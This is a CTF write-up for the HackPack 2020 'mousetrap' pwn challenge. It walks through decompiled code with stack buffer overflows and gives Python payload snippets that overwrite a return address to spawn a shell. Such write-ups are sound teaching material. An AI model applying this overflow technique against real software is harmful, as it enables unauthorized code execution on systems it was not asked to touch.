
## mousetrap (232pt)
### Description

> Are you savvy enough to steal a piece of cheese?
>
> nc cha.hackpack.club 41719

### Attachment

[mousetrap](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/HackPack-CTF-2020/pwn/mousetrap/mousetrap)

### Analysis

When I try to input a long serials of `'a'` I see that:

![](http://image.taqini.space/img/20200429192949.png)

that means some variable was overwritten.

Then analyze the program:

```c
int __cdecl main(int argc, const char **argv, const char **envp){
  char v4; // [rsp+10h] [rbp-120h]
  char v5; // [rsp+110h] [rbp-20h]
  __int64 v6; // [rsp+128h] [rbp-8h]

  v6 = 10LL;
  init(*(_QWORD *)&argc, argv, envp);
  menu();
  set_mouse_name(&v5);
  deactivate_trap(&v4, v6);
  grab_cheese(&v4);
  printf("SNAAAAAAAP! you died!");
  return 0;
}
```


```c
ssize_t __fastcall set_mouse_name(void *a1){
  printf("Name: ");
  return read(0, a1, 0x20uLL);
}
```
> read 32  bytes to `v5` while size of `v5` is only 24 bytes
>
> So we can overwrite backward to `v6` with 8 bytes

```c
ssize_t __fastcall deactivate_trap(__int64 a1, __int64 a2){
  size_t nbytes; // ST00_8
  void *buf; // ST08_8

  printf("Enter Code Sequence of %ld: ", a2, a2, a1);
  return read(0, buf, nbytes);
}
```

> In gdb we can see that`v6` is `nbytes` 
>
> We can control the value of `v6` so we can read as **many** as possible bytes to `buf`


```c
char *__fastcall grab_cheese(const char *a1){
  char dest; // [rsp+10h] [rbp-10h]

  return strcpy(&dest, a1);
}
```

> copy `buf` to `dest[0x10]` (buffer overflow again)

```c
int cheeeeeeeese(){
  return system("/bin/sh");
}
```

> When we call `cheeeeese`, we can get an shell.

### Solution

Overwrite `v6/nbytes` with 1000 (enough to overflow `dest`)

```python
payload = 'A'*24
payload += p64(1000)
sea('Name: ',payload)
```

Overwrite return address with `cheeeeese`

```python
cheeeeese = 0x040071B
pl2 = 'B'*24
pl2 += p64(cheeeeese)
sla('Enter Code Sequence of 1000: ',pl2)
```


### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/HackPack-CTF-2020/pwn/mousetrap) 


